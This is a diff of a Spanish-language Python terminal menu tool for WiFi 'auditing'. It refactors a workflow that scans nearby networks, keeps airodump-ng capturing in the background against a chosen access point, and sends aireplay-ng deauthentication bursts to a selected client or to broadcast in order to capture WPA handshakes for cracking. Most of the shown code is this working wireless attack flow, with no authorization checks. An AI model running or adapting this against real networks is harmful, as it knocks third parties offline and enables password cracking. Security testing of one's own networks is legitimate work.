@@ -339,67 +339,42 @@ def generar_menu_interfaces():
 # ==========================================
 # GESTIÓN DE AUDITORÍA INALÁMBRICA (WIFI)
 # ==========================================
-def habilitar_modo_monitor(interfaz):
-    """Mata procesos conflictivos y levanta la interfaz en modo monitor"""
-    print(f"[*] Preparando la interfaz {interfaz} para modo monitor...")
-    os.system("sudo airmon-ng check kill")
-    os.system(f"sudo airmon-ng start {interfaz}")
-    print(f"\n[+] Interfaz configurada. Normalmente cambia de nombre (ej. {interfaz}mon o wlan0mon).")
-    print("\nVerifica el nuevo nombre con ifconfig o en el menú de selección.")
 
-def generar_menu_monitor():
-    """Genera menú con interfaces disponibles para poner en modo monitor"""
-    menu = Menu("ACTIVAR MODO MONITOR")
-    interfaces = obtener_interfaces() 
-    if not interfaces:
-        menu.agregar_opcion("No se encontraron interfaces", AccionBash("Error", "echo 'No hay interfaces de red detectadas.'"))
-        return menu
-    for iface in interfaces:
-        menu.agregar_opcion(f"Poner {iface} en modo monitor", AccionPython(f"Monitor {iface}", habilitar_modo_monitor, iface))
-    return menu
-
-# --- NUEVA LÓGICA DE CAPTURA CON MENÚS DINÁMICOS Y SIN GUI ---
-
-def lanzar_ataque_captura(interfaz, target, station):
-    """Callback final: Ejecuta la captura en background y la desautenticación en foreground"""
-    print(f"[*] Preparando entorno de ataque para: {target['essid']} (BSSID: {target['bssid']})")
-    print(f"[*] Cliente objetivo: {station}")
-
+def iniciar_ataque_y_generar_menu(interfaz, target, station):
+    """Submenú 4: Menú interactivo de ataque que mantiene airodump-ng en segundo plano"""
     timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
     session_dir = f"{BASE_DIR_WIFI}/Auditoria-{timestamp}"
     os.makedirs(session_dir, exist_ok=True)
-
-    print(f"\n[*] Iniciando airodump-ng en segundo plano (sin GUI)...")
-    print(f"[*] Los archivos de captura se guardarán en: {session_dir}/Captura")
     
-    # Lanzamos airodump-ng en background (&) y redirigimos su salida para no ensuciar la terminal
-    comando_airodump = f"sudo airodump-ng --channel {target['ch']} --bssid {target['bssid']} -w {session_dir}/Captura {interfaz} > /dev/null 2>&1 &"
-    os.system(comando_airodump)
+    # Limpieza preventiva por si quedó un proceso fantasma de esta misma red
+    os.system(f"sudo pkill -f 'airodump-ng --channel {target['ch']} --bssid {target['bssid']}' > /dev/null 2>&1")
+    
+    # Iniciamos airodump-ng silenciosamente en background
+    os.system(f"sudo airodump-ng --channel {target['ch']} --bssid {target['bssid']} -w {session_dir}/Captura {interfaz} > /dev/null 2>&1 &")
+    
+    menu = Menu(f"ATAQUE EN CURSO: {target['essid'][:10]}")
+    
+    comando_deauth = f"sudo aireplay-ng -0 9 -a {target['bssid']} -c {station} {interfaz}"
+    
+    # Puedes presionar espacio aquí repetidas veces para enviar múltiples ráfagas
+    menu.agregar_opcion("=> 1. Enviar ráfaga de desautenticación <=", AccionBash("Deauth", comando_deauth))
+    menu.agregar_opcion("=> 2. FINALIZAR ATAQUE (Detener Airodump) <=", AccionPython("Detener", detener_ataque_bg, target, session_dir))
+    
+    return menu
 
-    time.sleep(2) # Darle 2 segundos a airodump para que empiece a escuchar en el canal correcto
-
-    try:
-        # Bucle de ataque
-        while True:
-            print(f"\n[*] Enviando paquetes de desautenticación a {station}...")
-            os.system(f"sudo aireplay-ng -0 9 -a {target['bssid']} -c {station} {interfaz}")
-
-            repetir = input("\n[?] ¿Desea volver a enviar paquetes de desautenticación? (y/n): ").strip().lower()
-            if repetir != 'y':
-                break
-    finally:
-        print("\n[*] Deteniendo el proceso de airodump-ng en segundo plano...")
-        # Buscamos y matamos especificamente el airodump de esta red
-        os.system(f"sudo pkill -f 'airodump-ng --channel {target['ch']} --bssid {target['bssid']}'")
-
-    print(f"\n[+] Auditoría finalizada. Revisa la carpeta {session_dir}/ para los Handshakes.")
+def detener_ataque_bg(target, session_dir):
+    """Callback para matar airodump-ng cuando el usuario decide terminar"""
+    os.system(f"sudo pkill -f 'airodump-ng --channel {target['ch']} --bssid {target['bssid']}'")
+    print("\n[*] Proceso airodump-ng detenido exitosamente.")
+    print(f"[+] Revisa la carpeta en busca del handshake: {session_dir}/")
+    print("\n[!] IMPORTANTE: Ahora presiona la tecla IZQUIERDA (←) para volver al menú de clientes.")
 
 def generar_menu_clientes(interfaz, target, clientes_objetivo):
     """Submenú 3: Seleccionar cliente a desautenticar"""
     menu = Menu(f"CLIENTES EN: {target['essid'][:10]}")
     
     menu.agregar_opcion("=> Enviar a todos (Broadcast FF:FF:FF:FF:FF:FF) <=", 
-                        AccionPython("Broadcast", lanzar_ataque_captura, interfaz, target, "FF:FF:FF:FF:FF:FF"))
+                        AccionMenuDinamico("Broadcast", lambda i=interfaz, t=target, s="FF:FF:FF:FF:FF:FF": iniciar_ataque_y_generar_menu(i, t, s)))
 
     if not clientes_objetivo:
         menu.agregar_opcion("[No se detectaron clientes. Solo puedes usar Broadcast]", 
@@ -407,12 +382,11 @@ def generar_menu_clientes(interfaz, target, clientes_objetivo):
     else:
         for c_mac in clientes_objetivo:
             menu.agregar_opcion(f"Desautenticar cliente: {c_mac}", 
-                                AccionPython(f"Ataque {c_mac}", lanzar_ataque_captura, interfaz, target, c_mac))
+                                AccionMenuDinamico(f"Ataque {c_mac}", lambda i=interfaz, t=target, s=c_mac: iniciar_ataque_y_generar_menu(i, t, s)))
     return menu
 
 def escaneo_y_generar_menu_redes(interfaz):
     """Submenú 2: Escanear el entorno por 10s y generar menú con las redes encontradas"""
-    # Pausamos TUI para mostrar el progreso de los 10 segundos
     curses.endwin()
     os.system('clear')
     print(f"[*] Iniciando escaneo silencioso de 10 segundos en {interfaz}...")
@@ -421,13 +395,11 @@ def escaneo_y_generar_menu_redes(interfaz):
     scan_base = "/tmp/wifi_scan"
     os.system(f"sudo rm -f {scan_base}-01.csv")
     
-    # Escaneo de 10 segundos
     os.system(f"sudo timeout 10s airodump-ng {interfaz} -w {scan_base} --output-format csv > /dev/null 2>&1")
 
     redes = []
     clientes = []
     
-    # Parseo del CSV
     try:
         with open(f"{scan_base}-01.csv", "r", encoding="utf-8", errors="ignore") as f:
             contenido = f.read()
@@ -459,20 +431,19 @@ def escaneo_y_generar_menu_redes(interfaz):
 
     if not redes:
         menu_vacio = Menu("RESULTADOS DEL ESCANEO")
-        menu_vacio.agregar_opcion("No se encontraron redes. (Regresar)", AccionBash("Vacío", "echo 'Intenta acercarte al objetivo o revisar tu antena.'"))
+        menu_vacio.agregar_opcion("No se encontraron redes. (Regresar)", AccionBash("Vacío", "echo 'Intenta acercarte al objetivo.'"))
         return menu_vacio
 
     menu_redes = Menu("SELECCIONAR RED OBJETIVO")
     for red in redes:
         clientes_red = [c["mac"] for c in clientes if c["bssid"] == red["bssid"]]
         texto_opcion = f"{red['essid']} (CH:{red['ch']} | BSSID:{red['bssid']} | Clientes:{len(clientes_red)})"
-        # Usamos lambda inyectando las variables actuales para no solapar los valores en el bucle
         menu_redes.agregar_opcion(texto_opcion, 
                                   AccionMenuDinamico(f"Red {red['essid']}", lambda i=interfaz, r=red, c=clientes_red: generar_menu_clientes(i, r, c)))
     return menu_redes
 
 def generar_menu_interfaces_captura():
-    """Submenú 1: Seleccionar la interfaz para iniciar el Wizard"""
+    """Submenú 1: Seleccionar la interfaz para iniciar la captura"""
     menu = Menu("SELECCIONAR INTERFAZ PARA CAPTURA")
     interfaces = obtener_interfaces()
 
@@ -487,7 +458,7 @@ def generar_menu_interfaces_captura():
 
 
 # ==========================================
-# EXPLORADOR DE HANDSHAKES
+# EXPLORADOR DE HANDSHAKES (Ranger Eliminado)
 # ==========================================
 def generar_menu_archivos_wifi(ruta_carpeta):
     nombre_carpeta = os.path.basename(ruta_carpeta)
@@ -503,14 +474,11 @@ def generar_menu_archivos_wifi(ruta_carpeta):
 
     for archivo in archivos:
         ruta_archivo = os.path.join(ruta_carpeta, archivo)
-        # Si es .cap o .csv usamos ls -l o aircrack-ng para inspeccionarlo, si es txt lo leemos
         if archivo.endswith('.cap'):
             menu.agregar_opcion(f"{archivo} (Ver Info)", AccionBash("Aircrack Info", f"aircrack-ng '{ruta_archivo}'"))
         else:
             menu.agregar_opcion(f"{archivo} (Leer)", AccionBash(f"Leyendo {archivo}", f"less '{ruta_archivo}'"))
 
-    # Agregamos la opción de abrir Ranger directamente en esta carpeta
-    menu.agregar_opcion("=> ABRIR CARPETA EN RANGER <=", AccionBash("Ranger", f"ranger '{ruta_carpeta}'"))
     return menu
 
 def generar_menu_carpetas_wifi():
@@ -527,10 +495,7 @@ def generar_menu_carpetas_wifi():
         ruta_carpeta = os.path.join(BASE_DIR_WIFI, carpeta)
         menu.agregar_opcion(f"{carpeta}", AccionMenuDinamico(carpeta, lambda r=ruta_carpeta: generar_menu_archivos_wifi(r)))
     
-    # Explorar directorio raíz con ranger
-    menu.agregar_opcion("=> EXPLORAR TODO CON RANGER <=", AccionBash("Ranger Root", f"ranger '{BASE_DIR_WIFI}'"))
     return menu
-
 
 # ==========================================
 # 6. ÁRBOL DE MENÚS Y COMPILACIÓN
